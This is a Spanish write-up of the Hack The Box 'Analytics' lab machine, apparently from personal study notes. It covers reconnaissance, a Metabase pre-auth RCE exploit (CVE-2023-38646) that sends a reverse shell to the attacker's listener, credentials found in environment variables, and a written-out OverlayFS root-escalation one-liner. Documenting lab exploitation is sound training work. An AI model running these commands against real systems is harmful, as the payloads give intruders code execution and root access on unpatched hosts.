---
title: Writeup analytics - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - analytics
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina analytics en Hack The Box.
keywords:
  - writeup analytics
  - hack the box analytics
  - resolución máquina fawn
  - analytics hack the box
  - htb analytics
---
-----------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Linux/Analytics)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=zlSEHorgrOI)|[Parte2](https://www.youtube.com/watch?v=jwUMEJ1KtzY)
- 🧠 **Explicación resumida**: 

---

#easy #linux #nmap #ping #CVE-2023-2640-CVE-2023-32629 #tratamientotty #reverseshell #ssh #gobuster #/etc/hosts #wappalyzer #whatweb #CVE-2023-38646 #env #informacionexpuestaenvariablesdeenterno #ssh #CVE-2023-2640-CVE-2023-32629 #uname #lsb_release #cat #gitclone #nc-nlvp443 

------
# Guided Mode

1)¿Cuántos puertos TCP abiertos escuchan en análisis?
	2

2)¿Qué subdominio está configurado para proporcionar una aplicación diferente en el servidor web de destino?
	data.analytical.htb

3)¿Qué aplicación se ejecuta en data.analytical.htb?
	metabase

4)¿Qué versión de Metabase está ejecutando el objetivo?
	v0.46.6

5)¿Cuál es la ID de CVE 2023 asignada a la vulnerabilidad de ejecución de código remoto de preautenticación en esta versión de Metabase?
	CVE-2023-38646

6)¿Cuál es el valor de la configuración de Token utilizada por esta instancia de metabase?
	249fa03d-fd94-4d5b-b94f-b4ebf3df681f

7)¿Qué punto final de la API de Metabase se usa para ejecutar comandos arbitrarios usando el token?
	/api/setup/validate

8)¿A qué usuario se está ejecutando la aplicación Metabase?
	metabase

9)¿Qué variable de entorno contiene la contraseña para el usuario de Metalytics?
	

*La pregunta anterior es la flag de user.txt*
11)¿Qué versión de kernel está instalada en el sistema de host?
	6.2.0-25-generic

12)¿Qué lanzamiento de Ubuntu se ejecuta el sistema? La respuesta es del formato.
	22.04

13)¿Qué componente utilizado por el sistema operativo Ubuntu en el sistema de destino es vulnerable a una vulnerabilidad de escalada de privilegios asignada dos 2023 CVE?
	OverlayFS

-------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.11.233
nmap -p- --open -vvv --min-rate 5000 -sS -n -Pn 10.10.11.233 -oG allPorts
extractPorts allPorts
nmap -sCV -p22,80 10.10.11.233 -oN targetTCP
nmap -sU --top-ports 200 -n -Pn -vvv 10.10.11.233 -oN targetUDP
```

![[Analytics1.png]]
![[Analytics3.png]]
![[Analytics4.png]]

*TTL:* Maquina linux
*Puertos TCP:*
	`22` [[ssh]]
	`80` HTTP
*Puertos UDP:*
	No nos da informacion relevante

--------
# Agregamos dominio al /etc/hosts

Si entramos a la pagina web, nos redirige a analytical.htb
![[Analytics5.png]]

Vamos a agregar el siguiente contenido al archivo /etc/hosts

```
10.10.11.233 analytical.htb
```

![[Analytics6.png]]

Ahora si nos carga el contenido de la pagina
![[Analytics7.png]]

-----
# [[Whatweb-wappalyzer]]

```
whatweb http://analytical.htb/
```

![[Analytics11.png]]

![[Analytics8.png]]
Nos dan los mail demo@analytical.com y due@analytical.com
No encuentro otra informacion relevante

-------
# [[Gobuster]]

```
gobuster vhost -u http://analytical.htb/ -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 64 --append-domain
```
![[Analytics13.png]]
Encontramos el subdominio data.analytical.htb

--------
# Agregamos el subdominio al /etc/hosts

Vamos a agregar el siguiente contenido al archivo /etc/hosts

```
10.10.11.233 data.analytical.htb
```

![[Analytics12.png]]

Y ahora cuando entramos a la pagina nos aparece este panel de logeo

![[Analytics14.png]]
Que vemos que se llama Metabase
No podia encontrar la version, asi que agarre el codigo fuente y lo puse en un editor de texto que en mi caso en [[nvim]]
Y filtrando por la palabra *Version*
![[Analytics15.png]]
Pude encontrar que esta corriendo la version *Metabase 0.46.6*. Asi que buscando en internet vemos que la misma tiene el [[CVE-2023-38646]]

-----------
# Intrusion a la maquina con [[CVE-2023-38646]]

Vamos a utilizar el siguiente repositorio de [UserConecting](https://github.com/UserConnecting/Exploit-CVE-2023-38646-Metabase)
Con [[git clone]] usando `git clone https://github.com/UserConnecting/Exploit-CVE-2023-38646-Metabase` lo vamos a clonar en nuestro directorio actual de trabajo

Nos dice entremos al siguiente link http://data.analytical.htb/api/session/properties para sacar el setup-token, que lo vamos a necesitar para hacer la explotacion
![[Analytics16.png]]
*249fa03d-fd94-4d5b-b94f-b4ebf3df681f*

Ahora vamos a usar el comando `python3 metabase_exploit.py http://data.analytical.htb 249fa03d-fd94-4d5b-b94f-b4ebf3df681f revshell 10.10.16.15:443` para ejecutar el exploit, mientras estamos en escucha con [[nc -nlvp 443]] para recibir la [[Reverse shell]]

![[Analytics17.png]]

![[Analytics18.png]]
Y ya ganamos acceso como el usuario metabase, aunque como no es una tty, no nos va a dejar hacer un [[Tratamiento de la TTY]]

-----
# Escalada de privilegios al usuario metalytics con [[Informacion expuesta en variables de enterno]]

Usamos [[env]] para ver todas las variables de entorno y vemos estas dos variables

![[Analytics19.png]]

META_USER=metalytics
META_PASS=An4lytics_ds20223#

#### Conexion por [[ssh]]

![[Analytics20.png]]
![[Analytics21.png]]
Ya estamos adentro como metalytics

----
# [[Tratamiento de la TTY]]

------
# Escalada de privilegios al usuario root con [[CVE-2023-2640-CVE-2023-32629]]

Vemos que version de kernel esta corriendo con [[uname]] y el comando `uname -r` y para ver si el sistema es de 32 o 64 bits usamos `uname -m`

![[Analytics22.png]]
Y con [[lsb_release]] usando `lsb_release -a` vamos a ver que distribucion estan usando
![[Analytics23.png]]
Y nos da que tenemos un *ubuntu 22.04* de 32 bits y version de kernel 6.2.0-25-generic

Buscando informacion sobre esta version encontramos los [[CVE-2023-2640-CVE-2023-32629]]. Y encontramos el [repositorio de g1vi](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/tree/main) que nos muestra el payload que tenemos que poner para hacer la explotacion

```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

![[Analytics24.png]]
Ya somos root y podemos catear las flags